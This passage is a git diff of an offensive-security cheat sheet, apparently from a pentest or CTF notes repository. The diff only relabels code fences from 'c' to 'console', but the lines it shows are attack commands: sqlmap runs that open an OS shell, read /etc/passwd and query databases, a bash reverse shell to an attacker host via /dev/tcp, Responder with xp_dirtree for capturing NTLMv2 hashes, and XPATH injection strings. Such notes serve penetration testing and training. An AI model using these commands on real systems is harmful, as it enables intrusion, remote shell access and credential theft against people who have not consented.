 ### Using Web Sockets
 
-```c
+```console
 $ sqlmap --url "ws://<DOMAIN>" --data='{"params":"help","token":"<TOKEN>"}'
 ```
 
@@ -1346,7 +1346,7 @@ $ sqlmap --url "ws://<DOMAIN>" --data='{"params":"help","token":"<TOKEN>"}'
 
 Try to install potentially missing modules first.
 
-```c
+```console
 $ pip install websocket-client
 $ pip3 install websocket-client
 $ pip install websocket-client-py3
@@ -1358,7 +1358,7 @@ $ pip3 install sqlmap-websocket-proxy
 If this does not help, uninstall the modules manually
 and re-install them afterwards.
 
-```c
+```console
 $ pip install websocket-client
 $ pip3 install websocket-client
 $ pip uninstall websocket-client-py3
@@ -1369,7 +1369,7 @@ $ pip3 uninstall websocket-client-py3
 
 > https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
 
-```c
+```console
 from http.server import SimpleHTTPRequestHandler
 from socketserver import TCPServer
 from urllib.parse import unquote, urlparse
@@ -1433,43 +1433,43 @@ except KeyboardInterrupt:
 
 #### Execution
 
-```c
+```console
 $ sqlmap -u "http://localhost:8081/?id=1" --batch --dbs
 ```
 
 ### Getting Shell
 
-```c
+```console
 $ sqlmap -u 'http://<RHOST>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq" --os-shell
 ```
 
 ### Getting Reverse Shell
 
-```c
+```console
 $ os-shell> bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
 ```
 
 ### Upgrade Shell
 
-```c
+```console
 $ postgres@<RHOST>:/home$ SHELL=/bin/bash script -q /dev/null
 ```
 
 ### File Read
 
-```c
+```console
 $ sqlmap -R <REQUEST> --level 5 --risk 3 --file-read=/etc/passwd --batch
 ```
 
 ### Search for Email
 
-```c
+```console
 $ sqlmap -r <REQUEST>.reg -p email --level 4 --risk 3 --batch
 ```
 
 ### Grabbing NTLMv2 Hashes with sqlmap and Responder
 
-```c
+```console
 $ sudo python3 Responder.py -I <INTERFACE>
 $ sqlmap -r login.req --sql-query="exec master.dbo.xp_dirtree '\\\\<LHOST>\\share'"
 ```
@@ -1478,17 +1478,17 @@ $ sqlmap -r login.req --sql-query="exec master.dbo.xp_dirtree '\\\\<LHOST>\\shar
 
 > https://github.com/BKreisel/sqlmap-websocket-proxy
 
-```c
+```console
 $ sqlmap-websocket-proxy -u 'ws://ws.<RHOST>:5789/version' -p '{"version": "2\u0022 %param%"}' --json
 ```
 
-```c
+```console
 $ sqlmap -u 'http://localhost:8080/?param1=1'
 ```
 
 ## sqsh
 
-```c
+```console
 $ sqsh -S <RHOST> -U <USERNAME>
 $ sqsh -S '<RHOST>' -U '<USERNAME>' -P '<PASSWORD>'
 $ sqsh -S '<RHOST>' -U '.\<USERNAME>' -P '<PASSWORD>'
@@ -1496,13 +1496,13 @@ $ sqsh -S '<RHOST>' -U '.\<USERNAME>' -P '<PASSWORD>'
 
 ### List Files and Folders with xp_dirtree
 
-```c
+```console
 1> EXEC master.sys.xp_dirtree N'C:\inetpub\wwwroot\',1,1;
 ```
 
 ## XPATH Injection
 
-```c
+```console
 test' or 1=1 or 'a'='a
 test' or 1=2 or 'a'='a
 'or substring(Password,1,1)='p' or'    // checking letter "p" on the beginning of the password
